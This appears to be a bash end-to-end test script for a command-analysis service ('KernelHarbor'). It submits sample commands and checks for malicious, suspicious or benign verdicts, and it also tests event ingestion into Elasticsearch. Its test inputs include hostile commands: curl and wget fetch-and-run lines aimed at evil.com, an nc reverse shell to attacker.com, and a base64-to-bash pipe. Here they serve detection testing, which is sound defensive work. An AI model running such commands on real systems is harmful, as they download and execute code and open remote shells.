#!/bin/bash
set -e

# Increase timeout for curl
export CURL_TIMEOUT=120

ANALYSIS_URL="${ANALYSIS_URL:-http://localhost:8080}"
ES_URL="${ES_URL:-http://localhost:9200}"
INDEX_NAME="${INDEX_NAME:-kb-events}"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

pass() { echo -e "${GREEN}✓ PASS${NC}: $1"; }
fail() {
  echo -e "${RED}✗ FAIL${NC}: $1"
  exit 1
}
warn() { echo -e "${YELLOW}⚠ WARN${NC}: $1"; }
info() { echo -e "ℹ $1"; }

check_service() {
  local url=$1
  local name=$2
  local max_attempts=${3:-5}
  local attempt=1
  
  while [ $attempt -le $max_attempts ]; do
    if curl -s -f "$url" >/dev/null 2>&1; then
      pass "$name is running"
      return 0
    fi
    echo "Waiting for $name... ($attempt/$max_attempts)"
    sleep 2
    attempt=$((attempt + 1))
  done
  fail "$name is not running at $url"
}

wait_for_service() {
  local url=$1
  local name=$2
  local max_attempts=${3:-30}
  local attempt=1
  
  while [ $attempt -le $max_attempts ]; do
    if curl -s -f "$url" >/dev/null 2>&1; then
      info "$name is ready after $attempt attempts"
      return 0
    fi
    sleep 1
    attempt=$((attempt + 1))
  done
  warn "$name not ready after $max_attempts seconds"
}

extract_verdict() {
  echo "$1" | grep -o '"verdict"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/.*"\([^"]*\)"$/\1/'
}

extract_confidence() {
  echo "$1" | grep -o '"confidence"[[:space:]]*:[[:space:]]*[0-9.]*' | grep -o '[0-9.]*'
}

analyze() {
  local query=$1
  curl -s -X POST "$ANALYSIS_URL/analyze" \
    -H "Content-Type: application/json" \
    -d "{\"host.name\":\"test-host\",\"query\":\"$query\"}"
}

check_es_index() {
  curl -s -f "$ES_URL/$INDEX_NAME" >/dev/null 2>&1
}

clear_es_index() {
  if check_es_index; then
    info "Clearing ES index $INDEX_NAME"
    curl -s -X DELETE "$ES_URL/$INDEX_NAME" >/dev/null 2>&1 || true
  fi
}

echo "=========================================="
echo "KernelHarbor E2E Test Suite"
echo "=========================================="
echo ""

info "Checking services..."
check_service "$ANALYSIS_URL/health" "Analysis API"

# Elasticsearch is broken on GitHub Actions runner images (20260209+)
# See: https://github.com/actions/runner-images/issues/13684
if [ "$CI" = "true" ]; then
  warn "Skipping Elasticsearch check in CI (broken on new runner images)"
else
  check_service "$ES_URL" "Elasticsearch"
fi

wait_for_service "$ANALYSIS_URL/ready" "Analysis API ready"

echo ""
info "Running tests..."

echo ""
echo "--- Test 1: Malicious - curl pipe bash ---"
RESPONSE=$(analyze "curl http://evil.com/payload.sh | bash")
VERDICT=$(extract_verdict "$RESPONSE")
CONF=$(extract_confidence "$RESPONSE")
if [ "$VERDICT" = "malicious" ]; then
  pass "curl pipe bash detected as malicious (confidence: $CONF)"
else
  fail "Expected malicious, got $VERDICT"
fi

echo ""
echo "--- Test 2: Suspicious - base64 encoded command ---"
RESPONSE=$(analyze "echo YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo= | base64 -d | bash")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "suspicious" ] || [ "$VERDICT" = "malicious" ]; then
  pass "Base64 encoded command detected as $VERDICT"
else
  fail "Expected suspicious/malicious, got $VERDICT"
fi

echo ""
echo "--- Test 3: Suspicious - Python reverse shell pattern ---"
RESPONSE=$(analyze "python3 -c 'import socket,subprocess,os'")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "suspicious" ] || [ "$VERDICT" = "malicious" ]; then
  pass "Python reverse shell pattern detected as $VERDICT"
else
  fail "Expected suspicious/malicious, got $VERDICT"
fi

echo ""
echo "--- Test 4: Malicious - nc reverse shell ---"
RESPONSE=$(analyze "nc -e /bin/sh attacker.com 4444")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "malicious" ]; then
  pass "nc reverse shell detected as malicious"
else
  fail "Expected malicious, got $VERDICT"
fi

echo ""
echo "--- Test 5: Benign - ls command ---"
RESPONSE=$(analyze "ls -la /home/user/documents")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "benign" ]; then
  pass "ls command detected as benign"
else
  fail "Expected benign, got $VERDICT"
fi

echo ""
echo "--- Test 6: Benign - git pull ---"
RESPONSE=$(analyze "git pull origin main")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "benign" ]; then
  pass "git pull detected as benign"
else
  fail "Expected benign, got $VERDICT"
fi

echo ""
echo "--- Test 7: Malicious - wget + execute ---"
RESPONSE=$(analyze "wget http://evil.com/script.sh && chmod +x script.sh && ./script.sh")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "malicious" ]; then
  pass "wget + execute detected as malicious"
else
  fail "Expected malicious, got $VERDICT"
fi

echo ""
echo "--- Test 8: Suspicious - Python reverse shell ---"
RESPONSE=$(analyze "python -c \"import socket,subprocess,os;s=socket.socket()\"")
VERDICT=$(extract_verdict "$RESPONSE")
if [ "$VERDICT" = "suspicious" ] || [ "$VERDICT" = "malicious" ]; then
  pass "Python reverse shell detected as $VERDICT"
else
  fail "Expected suspicious/malicious, got $VERDICT"
fi

echo ""
echo "--- Test 9: Ingest events to ES ---"
if [ "$CI" = "true" ]; then
  warn "Skipping in CI (Elasticsearch unavailable)"
else
  CLEAR_ES="${CLEAR_ES:-false}"
  if [ "$CLEAR_ES" = "true" ]; then
    clear_es_index
  fi

  INGEST_RESPONSE=$(curl -s -X POST "$ANALYSIS_URL/ingest" \
    -H "Content-Type: application/json" \
    -d '[
          {
              "@timestamp": "2026-03-29T12:00:00Z",
              "host.name": "test-host",
              "event.type": "execve",
              "event.id": "e2e-test-001",
              "process.pid": 12345,
              "image.path": "/usr/bin/curl",
              "command.line": "curl http://test.com/file",
              "user.name": "testuser"
          }
      ]')

  ACCEPTED=$(echo "$INGEST_RESPONSE" | grep -o '"accepted"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
  if [ "$ACCEPTED" = "1" ]; then
    pass "Event ingested successfully"
  else
    fail "Failed to ingest event"
  fi

  echo ""
  echo "--- Test 10: Verify event in Elasticsearch ---"
  sleep 2
  ES_COUNT=$(curl -s "$ES_URL/$INDEX_NAME/_count?q=event.id:e2e-test-001" | grep -o '"value"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
  if [ "$ES_COUNT" = "1" ]; then
    pass "Event stored in Elasticsearch"
  else
    fail "Event not found in Elasticsearch (count: $ES_COUNT)"
  fi
fi

echo ""
echo "=========================================="
pass "All tests passed!"
echo "=========================================="
echo ""
info "Summary:"
echo "  - Malicious: curl pipe bash, nc reverse shell, wget+execute"
echo "  - Suspicious: base64 encoded, Python reverse shell patterns"
echo "  - Benign: ls, git pull"
if [ "$CI" = "true" ]; then
  echo "  - Event ingestion: skipped (ES unavailable in CI)"
else
  echo "  - Event ingestion: working"
fi
echo ""
